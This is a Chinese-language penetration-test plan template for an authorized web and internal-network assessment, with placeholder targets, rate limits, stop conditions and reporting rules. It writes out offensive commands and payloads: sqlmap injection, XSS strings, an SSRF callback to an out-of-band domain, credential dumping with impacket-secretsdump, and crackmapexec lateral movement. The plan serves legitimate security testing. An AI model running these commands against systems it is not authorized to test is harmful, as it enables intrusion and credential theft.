## 渗透测试方案 · `TARGET` 授权评估

> 选型：单目标 Web/内网混合评估 · 5 阶段状态机 · 每阶段带判据与台账 · 工具链 nmap/ffuf/sqlmap/mitmproxy/impacket

---

### 阶段 0 · preflight（授权与前置）

| 项 | 内容 |
| --- | --- |
| 范围 | `TARGET`（域名/IP 段 `CIDR`）、`APP` 关联子域、指定内网段 `10.0.0.0/24` |
| 时间窗 | `YYYY-MM-DD 09:00` ~ `YYYY-MM-DD 18:00`，避开业务高峰 |
| 速率 | 扫描 ≤ `100 pps`；爆破线程 ≤ `10`；注入类单点串行 |
| 停止条件 | 触发 WAF 封禁 / 服务不可用 / 越出授权段 → 立即停并记录 |
| 回滚 | 变更类操作前留快照；测试账号与数据用后即删 |
| 授权凭证 | 书面授权书编号 `AUTH_ID`、应急联系人 `CONTACT` |

**判据**：目标清单、时间窗、限速、停止条件四件齐 → 进阶段 1。

---

### 阶段 1 · recon（信息收集）

**视角：侦察者**

```bash
# 子域枚举
subfinder -d TARGET -o subs.txt
# 存活探测
httpx -l subs.txt -ports 80,443,8080,8443 -o alive.txt
# 端口与服务
nmap -sS -sV -p- --min-rate 1000 -oA nmap_full TARGET
# 指纹
whatweb -i alive.txt --log-brief=web_fp.txt
# URL 收集
katana -list alive.txt -d 3 -o urls.txt
gau TARGET >> urls.txt
```

**判据**：每条结论带命令 + 回显，落 `RESULT_DIR/recon/`。

---

### 阶段 2 · asset（资产与入口）

**视角：资产管理员**

台账六字段，每条必填：

| 主机 | 端口/协议 | 服务/版本 | 证据（命令+回显） | 时间戳 | 来源工具 |
| --- | --- | --- | --- | --- | --- |
| `TARGET` | `443/tcp` | `nginx 1.24` | `nmap -sV` → `nginx 1.24.0` | `TS` | nmap |
| `APP` | `8080/tcp` | `Spring Boot` | `curl -I` → `Server: ...` | `TS` | httpx |

**判据**：新增 N 条，六字段齐全 → 进阶段 3。

---

### 阶段 3 · vuln（漏洞验证）

**视角：漏洞分析**

| 类别 | 探测 | 验证载荷 |
| --- | --- | --- |
| 目录/接口 | `ffuf -u https://TARGET/FUZZ -w WORDLIST -t 10` | 命中 200/403 逐点复核 |
| SQL 注入 | 参数 `id=1'` | `sqlmap -u "URL?id=1" --batch --dbs` |
| XSS | 反射点 | `<script>alert(1)</script>` / `"><img src=x onerror=alert(1)>` |
| SSRF | URL 参数 | `http://OAST_DOMAIN/` 外带 |
| 文件上传 | 上传点 | `PAYLOAD` 双扩展 / MIME 绕过 |
| 越权 | 水平/垂直 | 换 `ROLE_A`/`ROLE_B` 令牌重放 |
| 认证 | 登录口 | 弱口令字典 + 锁定策略探测 |

**判据**：只有**实际触发**的才算漏洞；版本号可疑标 `[推断]` 并给下一步验证动作。

---

### 阶段 4 · exploit（利用与横向）

**视角：利用者**

```bash
# 示例：拿到低权 shell 后
whoami && id && uname -a
# 凭据获取
impacket-secretsdump DOMAIN/user:pass@TARGET
# 横向
crackmapexec smb 10.0.0.0/24 -u USER -p PASS -d DOMAIN
```

**判据**：说明权限层级与影响面，附可复现命令与回显。

---

### 阶段 5 · report（取证与报告）

**视角：报告者**

- 时间线：`TS` 阶段 → 动作 → 结果
- 证据表：条目 / 来源 / 哈希（`sha256` 前 12 位）
- 结论分级：**已验证** / `[推断]`
- 修复建议按风险等级排序（严重/高/中/低）

**判据**：证据 N 条，路径/命令/哈希齐全，可复现。

---

### 自检清单

1. 每个结论有命令 + 回显？
2. `[推断]` 未混入已验证？
3. 台账六字段每条齐？
4. 失败分支写了"为什么没打进去"？
5. 报告给的是路径/命令/哈希而非"已完成"？

---

**交付物路径**：`RESULT_DIR/{recon,asset,vuln,exploit,report}/`，最终报告 `report/final.md`。